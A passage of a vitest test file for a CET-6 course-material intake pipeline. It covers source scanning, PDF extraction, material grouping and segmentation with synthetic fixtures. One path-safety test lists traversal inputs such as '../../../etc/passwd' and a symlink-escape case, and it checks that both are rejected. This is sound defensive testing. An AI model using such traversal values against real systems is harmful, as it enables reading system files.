import { describe, expect, it } from "vitest";
import {
  mkdtempSync,
  mkdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
  readFileSync,
  existsSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
  assertNoAbsolutePaths,
  assetKeyOf,
  computeSourceDigest,
  extensionOf,
  inferModuleHint,
  isContentParsed,
  normalizeStem,
  scanSourceDirectory,
  sourceKindForExtension,
  stemOf,
} from "@/content/course-pipeline/sources";
import { extractPdfPages, pickStableQuote } from "@/content/course-pipeline/pdf-extract";
import { proposeMaterialGroupings } from "@/content/course-pipeline/grouping";
import { extractSegmentsForMaterial, segmentIdOf, MIN_SEGMENT_CHARS } from "@/content/course-pipeline/segment";
import {
  ALLOWED_SECTION_TYPES,
  buildCanonicalIndex,
  canonicalLibraryDigest,
  labelFor,
  matchSegments,
  scoreOf,
  AMBIGUITY_SCORE_GAP,
  MATCH_WEIGHTS,
} from "@/content/course-pipeline/match";
import {
  containment,
  hasEnoughSubstance,
  jaccard,
  projectForMatching,
  scriptProfile,
  shingles,
  tokenSet,
} from "@/content/course-pipeline/projection";
import { writeCourseCandidate, toCourseManifestJson } from "@/content/course-pipeline/candidate";
import {
  buildLinkPlan,
  evaluatePromotionGate,
  gatherPromotionInputs,
  readStoredCandidate,
  validateCourseReviewFile,
  promoteCourseCandidate,
  checkCandidateAssets,
  validateWithProduction,
  checkSourceCurrentness,
  isBlockingItemResolved,
  CourseCandidateMissingError,
} from "@/content/course-pipeline/review";
import { runCourseIntake } from "@/content/course-pipeline";
import { buildIndexFromDisk } from "@/content/course-pipeline/canonical";
import { validateCourseManifest } from "@/content/course/validator";
import { NormalizedCourseImporter } from "@/content/course/importer";
import { COURSE_MANIFEST_SCHEMA_VERSION } from "@/domain/course";
import { normalizeRelativePath, isWithin } from "@/content/paper/paths";
import {
  assertSafeCourseId,
  isSafeCourseId,
  resolveCandidateDir,
  resolvePromotedCourseDir,
  sanitizeForDisplay,
} from "@/content/course-pipeline/containment";
import { FORBIDDEN_MATCH_FEATURES, MATCH_DISPOSITIONS } from "@/content/course-pipeline/types";
import {
  FIXTURE_PASSAGE_A,
  FIXTURE_PASSAGE_B,
  FIXTURE_TRANSCRIPT,
  FIXTURE_TRANSLATION_REFERENCE,
  FIXTURE_TRANSLATION_SOURCE,
  buildCjkPdf,
  buildImageOnlyPdf,
  buildMinimalDocx,
  buildSilentWav,
  buildTextPdf,
  writeSourceTree,
} from "../scripts/course-source-fixture";
import {
  duplicateContentFixture,
  fullCourseFixture,
  imageOnlyPdfFixture,
  listeningFixture,
  malformedNumberingFixture,
  noStructuralCueFixture,
  pdfPlusDocxFixture,
  readingFixture,
  sameNameDifferentBytesFixture,
  translationFixture,
  unsupportedTypeFixture,
  writingFixture,
} from "../scripts/course-source-scenarios";
import { buildFixturePackage, writeFixturePackage } from "../scripts/paper-fixture";

/**
 * 课程导入与匹配流水线的对抗性测试。
 *
 * 覆盖任务要求的三张矩阵：SOURCE/PATH、LOGICAL MATERIALS、SEGMENTATION、
 * MATCHING、REVIEW、PROMOTION。
 *
 * ── 测试方法学（刻意的）──
 *
 * - **用真实磁盘**：每个用例在独立临时目录里创建真实文件。
 *   只断言内存对象无法发现"路径逃逸""符号链接""读盘失败"这类缺陷。
 * - **用真实 PDF 字节**：夹具是结构合法、可被 pdfjs 解析的 PDF，
 *   因此"抽取 → 分段"这条链路真的被走过。
 * - **不断言"看起来对"**：断言点落在**行为**上
 *   （例如"文件名相同但内容无关 ⇒ 不产生候选"），而不是源码字符串。
 */

// ---------------------------------------------------------------------------
// 工具
// ---------------------------------------------------------------------------

interface TempEnv {
  root: string;
  contentRoot: string;
  papersDir: string;
  candidatesDir: string;
  coursesDir: string;
  dispose(): void;
}

function makeEnv(): TempEnv {
  const root = mkdtempSync(join(tmpdir(), "cet6-course-pipeline-"));
  const contentRoot = join(root, "content");
  return {
    root,
    contentRoot,
    papersDir: join(contentRoot, "cet6", "papers"),
    candidatesDir: join(contentRoot, "course-candidates"),
    coursesDir: join(contentRoot, "courses"),
    dispose() {
      rmSync(root, { recursive: true, force: true });
    },
  };
}

async function intake(
  env: TempEnv,
  tree: Map<string, Buffer>,
  overrides: { courseId?: string; withPapers?: boolean } = {},
) {
  /*
   * 源目录刻意放在**标准源树**（`content/course-sources/`）之内。
   *
   * 这样候选取到的是 `standard` 源定位符（安全的相对路径），
   * 于是复核/晋升可以**自动**重新清点源来证明未漂移 —— 不需要任何 override。
   * 这同时覆盖了任务要求的"standard course-sources relative locator works"。
   * 外部源根那条路（`external`，需要 --source-root）由单独用例覆盖。
   */
  const standardRoot = join(env.contentRoot, "course-sources");
  const sourceRoot = join(standardRoot, `src-${Math.random().toString(36).slice(2, 8)}`);
  mkdirSync(sourceRoot, { recursive: true });
  writeSourceTree(sourceRoot, tree);
  if (overrides.withPapers) {
    writeFixturePackage(env.contentRoot, "fixture-paper", buildFixturePackage({ contentVersion: 1 }));
  }
  const result = await runCourseIntake({
    sourceRoot,
    courseId: overrides.courseId ?? "test-course",
    provider: "test_fixture_provider",
    edition: "test",
    title: "测试课程包",
    contentVersion: 1,
    provenance: { note: "合成夹具", reference: null, rightsNote: "合成夹具，无第三方权利。" },
    papersDir: env.papersDir,
    standardSourcesRoot: standardRoot,
  });
  return { result, sourceRoot };
}

/**
 * 求值门禁的**测试侧统一入口**。
 *
 * 与 CLI 共用 `gatherPromotionInputs`（磁盘侧事实的唯一采集实现）——
 * 这样"CLI 检查了源漂移、测试没检查"这类判据漂移不会发生。
 */
function gateFor(
  env: TempEnv,
  stored: ReturnType<typeof readStoredCandidate>,
  review: ReturnType<typeof validateCourseReviewFile>["file"],
  reviewErrors: string[],
  digest: string,
  options: { complete?: boolean; sourceRootOverride?: string | null } = {},
) {
  return evaluatePromotionGate(
    gatherPromotionInputs({
      stored,
      review,
      reviewErrors,
      canonical: { digest, complete: options.complete ?? true },
      standardSourcesRoot: join(env.contentRoot, "course-sources"),
      sourceRootOverride: options.sourceRootOverride ?? null,
    }),
  );
}

/** 写一份形状合法的 review.json（门禁路径测试用）。 */
function writeReview(
  env: TempEnv,
  courseId: string,
  overrides: {
    candidateChecksum?: string | null;
    canonicalLibraryDigest?: string;
    omitChecksum?: boolean;
    dispositions?: "accept_top" | "unmatched";
  } = {},
): void {
  const stored = readStoredCandidate(courseId, env.candidatesDir);
  const metadata = stored.metadata;
  const accepted = metadata.matching.segments
    .filter((segment) => segment.suggestions.length > 0)
    .map((segment) => {
      const top = segment.suggestions[0];
      if (overrides.dispositions === "unmatched") {
        return {
          segmentId: segment.segmentId,
          disposition: "intentionally_unmatched",
          paperId: null,
          targetScope: null,
          sectionId: null,
          groupId: null,
          questionId: null,
          note: "明确声明有意不匹配。",
          evidence: "测试夹具：有意不匹配是合法的，不需要链接（≥10 字符）。",
        };
      }
      return acceptedMatchEntry(segment.segmentId, top.target, "测试夹具依据建议的逐项证据作出该裁决（≥10 字符）。");
    });

  const file: Record<string, unknown> = {
    courseId,
    reviewer: "vitest",
    reviewedAt: "2026-01-01",
    canonicalLibraryDigest: overrides.canonicalLibraryDigest ?? metadata.matching.canonicalLibrary.digest,
    materialGroupings: metadata.grouping.proposals
      .filter((proposal) => proposal.reviewRequired)
      .map((proposal) => ({
        proposalId: proposal.id,
        decision: "accepted",
        note: "确认该分组。",
        evidence: "测试夹具依据候选记录的 basis 与 evidence 作出该裁决（≥10 字符）。",
      })),
    segments: metadata.segmentation.materials
      .flatMap((material) => material.segments)
      .filter((segment) => segment.reviewRequired)
      .map((segment) => ({
        segmentId: segment.id,
        decision: "accepted",
        note: "确认该段。",
        evidence: "测试夹具依据候选记录的 evidence.cues 与 lineSpan 作出该裁决（≥10 字符）。",
      })),
    matches: accepted,
    verifiedScope: ["测试夹具：候选结构、资产完整性与门禁路径"],
    notVerified: ["未做任何 canonical 对应关系的人工核验"],
  };
  if (!overrides.omitChecksum) {
    file.candidateChecksum = overrides.candidateChecksum ?? stored.recomputed.candidateChecksum;
  }
  mkdirSync(join(env.candidatesDir, courseId), { recursive: true });
  writeFileSync(join(env.candidatesDir, courseId, "review.json"), JSON.stringify(file, null, 2), "utf8");
}

// ===========================================================================
// SOURCE / PATH
// ===========================================================================

describe("SOURCE / PATH —— 源清点与路径安全", () => {
  it("递归发现：嵌套目录里的文件都被清点", () => {
    const env = makeEnv();
    try {
      const tree = new Map<string, Buffer>([
        ["a.pdf", buildTextPdf([["top level"]])],
        ["阅读/b/c.pdf", buildTextPdf([["nested"]])],
        ["听力/音频/d.wav", buildSilentWav()],
      ]);
      const root = join(env.root, "src");
      writeSourceTree(root, tree);
      const inventory = scanSourceDirectory(root);
      expect(inventory.assets.map((asset) => asset.relativePath).sort()).toEqual([
        "a.pdf",
        "听力/音频/d.wav",
        "阅读/b/c.pdf",
      ]);
      // 文件夹上下文必须记录（它是"不同目录不合并"的判据）
      expect(inventory.assets.find((a) => a.relativePath === "阅读/b/c.pdf")?.folderContext).toBe("阅读/b");
    } finally {
      env.dispose();
    }
  });

  it("不可读的源根抛出明确错误（而不是静默空结果）", () => {
    const env = makeEnv();
    try {
      expect(() => scanSourceDirectory(join(env.root, "does-not-exist"))).toThrow(/不存在|不可读/);
    } finally {
      env.dispose();
    }
  });

  it("符号链接逃逸：指向源根之外的文件被**拒绝读取**", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      mkdirSync(join(root, "阅读"), { recursive: true });
      writeFileSync(join(root, "阅读", "handout.pdf"), buildTextPdf([["Passage One", FIXTURE_PASSAGE_A]]));

      const outside = join(env.root, "outside-secret.pdf");
      writeFileSync(outside, buildTextPdf([["SECRET OUTSIDE CONTENT"]], ));

      let symlinksSupported = true;
      try {
        symlinkSync(outside, join(root, "阅读", "escape.pdf"));
      } catch {
        symlinksSupported = false;
      }

      const inventory = scanSourceDirectory(root);
      if (!symlinksSupported) {
        // 平台不支持符号链接时，至少断言清单里没有越界文件
        expect(inventory.assets.every((asset) => !asset.relativePath.includes("escape"))).toBe(true);
        return;
      }

      // 关键断言：越界文件**没有**被清点，而且**被明确登记为拒绝**
      expect(inventory.assets.some((asset) => asset.relativePath.includes("escape"))).toBe(false);
      const rejection = inventory.rejected.find((entry) => entry.relativePath.includes("escape.pdf"));
      expect(rejection).toBeDefined();
      expect(rejection?.reason).toMatch(/源根之外/);
      // 源根之外的字节绝不能出现在任何资产的校验和清单里
      expect(inventory.assets.some((asset) => asset.basename === "outside-secret.pdf")).toBe(false);
    } finally {
      env.dispose();
    }
  });

  it("不安全路径被词法层拦截（.. / 绝对路径 / 盘符 / 空字节）", () => {
    for (const unsafe of ["../../../etc/passwd", "/etc/passwd", "C:/Windows/system32", "a\0b", "a/../b"]) {
      expect(() => normalizeRelativePath(unsafe), `应当拒绝：${unsafe}`).toThrow();
    }
    // 合法路径必须通过
    expect(normalizeRelativePath("assets/handout.pdf")).toBe("assets/handout.pdf");
  });

  it("每个资产都记录 bytes 与 sha256（源字节可变 ⇒ 摘要可变）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, new Map([["a.pdf", buildTextPdf([["one"]])]]));
      const before = scanSourceDirectory(root);

      // 同名、同大小、**不同内容** —— 只有 sha256 能发现它
      writeFileSync(join(root, "a.pdf"), buildTextPdf([["two"]]));
      const after = scanSourceDirectory(root);

      expect(before.assets[0].sha256).not.toBe(after.assets[0].sha256);
      expect(before.digest).not.toBe(after.digest);
    } finally {
      env.dispose();
    }
  });

  it("重复内容（字节相同）被登记为 duplicate_content，不是两种表示", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, duplicateContentFixture());
      const inventory = scanSourceDirectory(root);
      const note = inventory.notes.find((item) => item.code === "duplicate_content");
      expect(note).toBeDefined();
      expect(note?.assetKeys).toHaveLength(2);
      expect(note?.detail).toMatch(/同一个文件的多份副本/);
    } finally {
      env.dispose();
    }
  });

  it("同名不同字节被登记为 same_name_different_bytes（文件名不是内容证据）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, sameNameDifferentBytesFixture());
      const inventory = scanSourceDirectory(root);
      const note = inventory.notes.find((item) => item.code === "same_name_different_bytes");
      expect(note).toBeDefined();
      expect(note?.detail).toMatch(/文件名的相似\*\*不是\*\*内容相同的证据/);
    } finally {
      env.dispose();
    }
  });

  it("不支持的类型被登记（kind=unsupported）而不是静默跳过", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, unsupportedTypeFixture());
      const inventory = scanSourceDirectory(root);
      const zip = inventory.assets.find((asset) => asset.extension === ".zip");
      expect(zip).toBeDefined();
      expect(zip?.kind).toBe("unsupported");
      expect(zip?.contentParsed).toBe(false);
      expect(inventory.notes.some((note) => note.code === "unsupported_type")).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("清点结果里不得出现绝对路径（结构性断言）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, translationFixture());
      const inventory = scanSourceDirectory(root);
      expect(() => assertNoAbsolutePaths(inventory, root)).not.toThrow();
      // 持久化内容里不能出现绝对路径
      expect(JSON.stringify(inventory)).not.toContain(env.root);
    } finally {
      env.dispose();
    }
  });

  it("扩展名 → 种类与是否解析内容的判据（只有 PDF 被内容解析）", () => {
    expect(sourceKindForExtension(".pdf")).toBe("pdf");
    expect(sourceKindForExtension(".docx")).toBe("docx");
    expect(sourceKindForExtension(".mp3")).toBe("audio");
    expect(sourceKindForExtension(".png")).toBe("image");
    expect(sourceKindForExtension(".zip")).toBe("unsupported");
    expect(isContentParsed("pdf")).toBe(true);
    for (const kind of ["docx", "audio", "image", "unsupported"] as const) {
      expect(isContentParsed(kind)).toBe(false);
    }
  });

  it("资产键是确定性且**纯 ASCII**（生产校验器要求 slug）", () => {
    // 真实课程目录大量使用中文名
    const a = assetKeyOf("阅读/讲义.pdf");
    const b = assetKeyOf("阅读/讲义.pdf");
    expect(a).toBe(b);
    expect(a).toMatch(/^[a-z0-9][a-z0-9._-]*$/);
    // 不同路径必须得到不同键
    expect(assetKeyOf("阅读/讲义.pdf")).not.toBe(assetKeyOf("听力/讲义.pdf"));
    // 纯中文文件名也要能产出合法键
    expect(assetKeyOf("阅读/完全中文名.pdf")).toMatch(/^[a-z0-9][a-z0-9._-]*$/);
  });

  it("stem / extension / normalizeStem / moduleHint 的判据", () => {
    expect(stemOf("handout.pdf")).toBe("handout");
    expect(stemOf("noext")).toBe("noext");
    expect(extensionOf("HANDOUT.PDF")).toBe(".pdf");
    expect(extensionOf("noext")).toBe("");

    expect(normalizeStem("讲义 - 副本")).toBe(normalizeStem("讲义"));
    expect(normalizeStem("handout(1)")).toBe(normalizeStem("handout"));
    expect(normalizeStem("Reading Handout")).toBe("reading handout");
    // 激进归一被刻意禁止：两份无关材料不得被合并
    expect(normalizeStem("第1套听力")).not.toBe(normalizeStem("第1套阅读"));

    expect(inferModuleHint(["阅读"]).hint).toBe("reading");
    expect(inferModuleHint(["listening"]).hint).toBe("listening");
    expect(inferModuleHint(["翻译"]).hint).toBe("translation");
    expect(inferModuleHint(["写作"]).hint).toBe("writing");
    // 最靠近文件的目录优先
    expect(inferModuleHint(["阅读", "听力", "音频"]).hint).toBe("listening");
    expect(inferModuleHint(["随机目录"]).hint).toBeNull();
  });

  it("源摘要对文件顺序不敏感（确定性）", () => {
    const make = (order: string[]) =>
      computeSourceDigest(
        order.map((name) => ({
          assetKey: assetKeyOf(name),
          relativePath: name,
          basename: name,
          stem: stemOf(name),
          extension: extensionOf(name),
          kind: sourceKindForExtension(extensionOf(name)),
          contentParsed: false,
          bytes: 1,
          sha256: "a".repeat(64),
          moduleHint: null,
          moduleHintBase: null,
          moduleHintBasis: null,
          folderContext: null,
          folderLabels: [],
        })) as never,
      );
    expect(make(["b.pdf", "a.pdf"])).toBe(make(["a.pdf", "b.pdf"]));
  });
});

// ===========================================================================
// PDF 抽取
// ===========================================================================

describe("PDF 抽取 —— 逐页来源证据与无文本层的诚实处理", () => {
  it("抽出逐页文本、行、原文与段落文本", async () => {
    const env = makeEnv();
    try {
      const file = join(env.root, "handout.pdf");
      writeFileSync(
        file,
        buildTextPdf([
          ["Passage One", "First line of the passage.", "Second line follows here."],
          ["Second page content arrives."],
        ]),
      );
      const doc = await extractPdfPages("asset-1", file);
      expect(doc.state).toBe("parsed");
      expect(doc.pages).toHaveLength(2);
      expect(doc.pages[0].lines).toContain("Passage One");
      expect(doc.pages[0].rawText).toContain("First line of the passage.");
      expect(doc.pages[0].paragraphText).toContain("First line of the passage.");
      expect(doc.pagesWithoutTextLayer).toEqual([]);
      expect(doc.tool?.name).toBe("pdfjs-dist");
    } finally {
      env.dispose();
    }
  });

  it("图片型（无文本层）PDF：如实上报，**不做 OCR**，不产生幻觉文本", async () => {
    const env = makeEnv();
    try {
      const file = join(env.root, "scanned.pdf");
      writeFileSync(file, buildImageOnlyPdf(2));
      const doc = await extractPdfPages("asset-scan", file);
      expect(doc.state).toBe("no_text_layer");
      expect(doc.pagesWithoutTextLayer).toEqual([1, 2]);
      expect(doc.pages.every((page) => page.hasTextLayer === false)).toBe(true);
      expect(doc.pages.every((page) => page.rawText === "")).toBe(true);
      // 抽取器绝不能"补出"任何内容
      expect(doc.pages.every((page) => page.lines.length === 0)).toBe(true);
      expect(doc.warnings.join(" ")).toMatch(/不做 OCR/);
      expect(doc.error).toBeNull();
    } finally {
      env.dispose();
    }
  });

  it("损坏/非 PDF 字节：解析失败被如实记录，不抛穿整条流水线", async () => {
    const env = makeEnv();
    try {
      const file = join(env.root, "broken.pdf");
      writeFileSync(file, Buffer.from("这不是一个 PDF 文件", "utf8"));
      const doc = await extractPdfPages("asset-broken", file);
      expect(doc.state).toBe("failed");
      expect(doc.error).not.toBeNull();
      expect(doc.pages).toHaveLength(0);
    } finally {
      env.dispose();
    }
  });

  it("稳定引文必须能在源件里核对到；核不到就不给引文", async () => {
    const env = makeEnv();
    try {
      const file = join(env.root, "handout.pdf");
      writeFileSync(file, buildTextPdf([["A sufficiently long line of source text appears here."]]));
      const doc = await extractPdfPages("asset-1", file);
      const picked = pickStableQuote(doc.pages);
      expect(picked.quote).not.toBeNull();
      expect(doc.pages[0].rawText).toContain(picked.quote!);
    } finally {
      env.dispose();
    }
  });

  it("中文 PDF（Identity-H + ToUnicode）能抽出中文原文", async () => {
    const env = makeEnv();
    try {
      const file = join(env.root, "translation.pdf");
      writeFileSync(file, buildCjkPdf([["翻译练习", FIXTURE_TRANSLATION_SOURCE]]));
      const doc = await extractPdfPages("asset-cjk", file);
      expect(doc.state).toBe("parsed");
      const text = doc.pages.map((page) => page.rawText).join("\n");
      expect(text).toContain("翻译练习");
      expect(/[\u4e00-\u9fff]/.test(text)).toBe(true);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// 逻辑材料分组
// ===========================================================================

describe("LOGICAL MATERIALS —— 文件 ≠ 逻辑材料", () => {
  it("PDF + DOCX 被提案为一份材料的两种表示，且**等价性需人工确认**", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, pdfPlusDocxFixture());
      const inventory = scanSourceDirectory(root);
      const parsedText = new Map<string, string>();
      for (const asset of inventory.assets) {
        if (asset.kind === "pdf") parsedText.set(asset.assetKey, FIXTURE_PASSAGE_A);
      }
      const result = proposeMaterialGroupings({ assets: inventory.assets, parsedText });

      expect(result.proposals).toHaveLength(1);
      const proposal = result.proposals[0];
      expect(proposal.representations).toHaveLength(2);
      expect(proposal.evidence.kinds).toContain("pdf");
      expect(proposal.evidence.kinds).toContain("docx");
      // DOCX 未被解析 ⇒ 等价性**没有被验证**
      expect(proposal.evidence.contentComparable).toBe(false);
      expect(proposal.reviewRequired).toBe(true);
      expect(proposal.reviewNotes.join(" ")).toMatch(/没有被验证|TEXT_EXTRACTION_DEFERRED|不被解析/);
    } finally {
      env.dispose();
    }
  });

  it("同名（归一化后）但内容确实冲突的两个 PDF ⇒ **歧义**且需复核（不得因同名就合并）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      // 归一化 stem 相同（`unit - 副本` → `unit`），两侧都是**有实质内容**的 PDF。
      // 关键：两侧内容必须都可解析且体量足够，否则机器**没有**证据判断它们是
      // 否同一份内容 —— 那种情况下它同样必须复核，只是理由不同（见下一个用例）。
      const tree = new Map<string, Buffer>([
        ["阅读/unit.pdf", buildTextPdf([["Passage One", ...FIXTURE_PASSAGE_A.split(". ")]])],
        ["阅读/unit - 副本.pdf", buildTextPdf([["Passage Two", ...FIXTURE_PASSAGE_B.split(". ")]])],
      ]);
      writeSourceTree(root, tree);
      const inventory = scanSourceDirectory(root);

      // 逐资产给**不同**的文本，模拟"两份同名但内容无关的讲义"
      const parsedText = new Map<string, string>();
      for (const asset of inventory.assets) {
        parsedText.set(asset.assetKey, asset.relativePath.includes("副本") ? FIXTURE_PASSAGE_B : FIXTURE_PASSAGE_A);
      }
      const result = proposeMaterialGroupings({ assets: inventory.assets, parsedText });

      // 它们必须被分到同一组（归一化 stem 相同）**并且**被判为歧义
      expect(result.proposals).toHaveLength(1);
      const proposal = result.proposals[0];
      expect(proposal.representations).toHaveLength(2);
      // 两侧都可比对 ⇒ 机器**有**证据说它们不是同一份内容
      expect(proposal.evidence.contentComparable).toBe(true);
      expect(proposal.ambiguous).toBe(true);
      expect(proposal.reviewRequired).toBe(true);
      expect(proposal.ambiguityReason).toMatch(/包含度|不得/);
      // 不变量仍必须成立
      expect(result.invariantViolations).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("同名但一侧内容太少（无法比对）⇒ 不判歧义，但**仍然必须复核**（不得默认合并）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      const tree = new Map<string, Buffer>([
        ["阅读/unit.pdf", buildTextPdf([["Passage One", ...FIXTURE_PASSAGE_A.split(". ")]])],
        ["阅读/unit - 副本.pdf", buildTextPdf([["Too short to compare meaningfully."]])],
      ]);
      writeSourceTree(root, tree);
      const inventory = scanSourceDirectory(root);
      const parsedText = new Map<string, string>();
      for (const asset of inventory.assets) parsedText.set(asset.assetKey, "短");
      const result = proposeMaterialGroupings({ assets: inventory.assets, parsedText });

      const proposal = result.proposals[0];
      expect(proposal.representations).toHaveLength(2);
      // 机器**无法**比对 ⇒ 不得声称"内容相同"，也不得声称"内容不同"
      expect(proposal.evidence.contentComparable).toBe(false);
      expect(proposal.evidence.textContainment).toBeNull();
      // 合并本身是提案 ⇒ 必须复核（这是"不得静默合并无关文件"的落点）
      expect(proposal.reviewRequired).toBe(true);
      expect(proposal.reviewNotes.join(" ")).toMatch(/没有被验证过/);
    } finally {
      env.dispose();
    }
  });

  it("不变量：每个资产恰好属于一份材料提案（不静默丢、不重复拥有）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, fullCourseFixture());
      const inventory = scanSourceDirectory(root);
      const result = proposeMaterialGroupings({ assets: inventory.assets });
      expect(result.invariantViolations).toEqual([]);

      // 反向核对：每个资产都出现在提案里，且只出现一次
      const owned = result.proposals.flatMap((proposal) =>
        proposal.representations.map((rep) => rep.assetKey),
      );
      expect(owned.length).toBe(inventory.assets.length);
      expect(new Set(owned).size).toBe(owned.length);
    } finally {
      env.dispose();
    }
  });

  it("不同目录的同名文件**不合并**（文件夹上下文是分组判据）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, sameNameDifferentBytesFixture());
      const inventory = scanSourceDirectory(root);
      const result = proposeMaterialGroupings({ assets: inventory.assets });
      // 两个 handout.pdf 在不同目录 ⇒ 必须是两份材料
      expect(result.proposals).toHaveLength(2);
      expect(result.invariantViolations).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("听力套装：讲义 + 文字稿 + 整段音频被归为一份材料（音频必须能到段上）", () => {
    const env = makeEnv();
    try {
      const root = join(env.root, "src");
      writeSourceTree(root, listeningFixture());
      const inventory = scanSourceDirectory(root);
      const parsedText = new Map(
        inventory.assets
          .filter((asset) => asset.kind === "pdf")
          .map((asset) => [asset.assetKey, FIXTURE_TRANSCRIPT]),
      );
      const result = proposeMaterialGroupings({ assets: inventory.assets, parsedText });
      const withAudio = result.proposals.filter((proposal) =>
        proposal.representations.some((rep) => rep.kind === "audio"),
      );
      expect(withAudio).toHaveLength(1);
      // 合并是提案 ⇒ 必须复核
      expect(withAudio[0].reviewRequired).toBe(true);
      // 不变量必须仍然成立（音频不能同时属于两份材料）
      expect(result.invariantViolations).toEqual([]);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// 分段
// ===========================================================================

describe("SEGMENTATION —— 保守、可核对、源件缺陷原样保留", () => {
  it("阅读：按篇章标记切段，正文进 text，课程答案进 notes（不是判分真相）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const reading = result.archive.manifest.segments.filter((segment) => segment.kind === "reading_passage");
      expect(reading.length).toBeGreaterThanOrEqual(2);

      const first = reading[0];
      expect(first.text).toContain("attention");
      expect(first.anchor.pageStart).not.toBeNull();
      expect(first.anchor.quote).not.toBeNull();
      expect(first.representationId).not.toBeNull();

      // 课程答案出现在 notes 里，且**明确标注为源件主张**
      const anyWithAnswerNote = reading.some((segment) => (segment.notes ?? "").includes("源件主张"));
      expect(anyWithAnswerNote).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("题号缺陷（重号/跳号）被上报但**不修正**", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, malformedNumberingFixture());
      const anomalies = result.segmentation.flatMap((material) => material.anomalies);
      const codes = anomalies.map((anomaly) => anomaly.code);
      expect(codes.some((code) => code === "question_number_duplicate" || code === "question_number_gap")).toBe(true);
      // 段仍然产出，且不因编号缺陷被"修正"内容
      expect(result.archive.manifest.segments.length).toBeGreaterThan(0);
      // 源件的错误编号必须原样保留在正文里
      const text = result.archive.manifest.segments.map((segment) => segment.text ?? "").join("\n");
      expect(text).toContain("46. This number is printed twice by the source.");
    } finally {
      env.dispose();
    }
  });

  it("结构线索缺失 ⇒ 文档级输出 + 复核，**不发明精确边界**", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, noStructuralCueFixture());
      const reading = result.archive.manifest.segments.filter((segment) => segment.kind === "reading_passage");
      expect(reading).toHaveLength(1);
      expect(result.archive.metadata.segmentation.documentLevelOnlyMaterials.length).toBeGreaterThan(0);
      expect(
        result.archive.review.some(
          (item) => item.code === "segment_requires_review" && item.detail.includes("文档级"),
        ),
      ).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("翻译：中文原文进 text，课程参考译文进 referenceTranslation（分离且不称官方）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, translationFixture());
      const translation = result.archive.manifest.segments.find(
        (segment) => segment.kind === "translation_passage",
      );
      expect(translation).toBeDefined();
      expect(/[\u4e00-\u9fff]/.test(translation!.text ?? "")).toBe(true);
      expect(/[A-Za-z]/.test(translation!.referenceTranslation ?? "")).toBe(true);
      // 课程译文的**说明文案**必须明确否认官方/标准/唯一权威地位。
      // （参考译文正文字面里出现"官方"等词不算违规，因此只检查 notes 的措辞。）
      expect(translation!.notes ?? "").toMatch(/不是唯一正确译法/);
      expect(translation!.notes ?? "").toMatch(/不是官方答案|课程材料/);
      // 参考译文与中文原文必须真的分开（不得混在一起）
      expect(translation!.text).not.toContain("As urban populations");
    } finally {
      env.dispose();
    }
  });

  it("写作/方法材料按**文档级**输出，不强行细分", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, writingFixture());
      const writing = result.archive.manifest.segments.filter(
        (segment) => segment.kind === "writing_template",
      );
      expect(writing).toHaveLength(1);
      expect(writing[0].text).toContain("Writing Template");
      // 文档级材料必须被登记
      expect(result.archive.metadata.segmentation.documentLevelOnlyMaterials.length).toBeGreaterThan(0);
    } finally {
      env.dispose();
    }
  });

  it("听力：音频按整段引用，**不推断时间区间**，不切分", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, listeningFixture());
      const listening = result.archive.manifest.segments.filter((segment) =>
        segment.kind.startsWith("listening_"),
      );
      expect(listening.length).toBeGreaterThan(0);
      for (const segment of listening) {
        // 生产校验器硬性要求：听觉段必须引用整段音频
        expect(segment.audioAssetId).not.toBeNull();
        // 本版本**绝不**推断时间区间
        expect(segment.startSeconds).toBeNull();
        expect(segment.endSeconds).toBeNull();
      }
    } finally {
      env.dispose();
    }
  });

  it("段 id 全局唯一且满足生产 slug 约束（多份同类材料也不冲突）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, fullCourseFixture());
      const ids = result.archive.manifest.segments.map((segment) => segment.id);
      expect(new Set(ids).size).toBe(ids.length);
      expect(ids.every((id) => /^[a-z0-9][a-z0-9._-]*$/.test(id))).toBe(true);
      expect(segmentIdOf("material-a", "reading", 1)).not.toBe(segmentIdOf("material-b", "reading", 1));
    } finally {
      env.dispose();
    }
  });

  it("每个材料内 order 从 0 连续", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, fullCourseFixture());
      for (const material of result.archive.manifest.materials) {
        const orders = result.archive.manifest.segments
          .filter((segment) => segment.materialId === material.id)
          .map((segment) => segment.order)
          .sort((a, b) => a - b);
        orders.forEach((value, index) => expect(value).toBe(index));
      }
    } finally {
      env.dispose();
    }
  });

  it("近空切片被并入相邻段（不产出只有标题的空段）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, listeningFixture());
      for (const segment of result.archive.manifest.segments) {
        const body = (segment.transcript ?? segment.text ?? "").replace(/\s+/g, " ").trim();
        // 每个段的正文都必须有实质内容
        expect(body.length).toBeGreaterThanOrEqual(MIN_SEGMENT_CHARS);
      }
    } finally {
